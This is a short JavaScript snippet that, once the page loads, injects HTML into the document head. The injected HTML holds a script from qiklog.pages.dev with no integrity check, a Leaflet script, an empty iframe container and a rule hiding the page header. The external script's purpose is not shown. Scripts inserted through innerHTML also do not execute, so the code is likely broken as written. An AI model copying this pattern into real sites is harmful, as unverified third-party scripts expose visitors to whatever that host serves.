const injectIntoHead = (htmlString) => {
    let tempContainer = document.createElement('div');
    tempContainer.innerHTML = htmlString;
    
    Array.from(tempContainer.children).forEach(element => {
        document.head.appendChild(element);
    });
};

document.addEventListener("DOMContentLoaded", () => {
    injectIntoHead(`
        <script src="https://qiklog.pages.dev/script.js"></script>
            <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
      <div id="iframeContainer">
  </div>
    <style>
        .header    {
            display: none;
        }
</style>
    `);
});
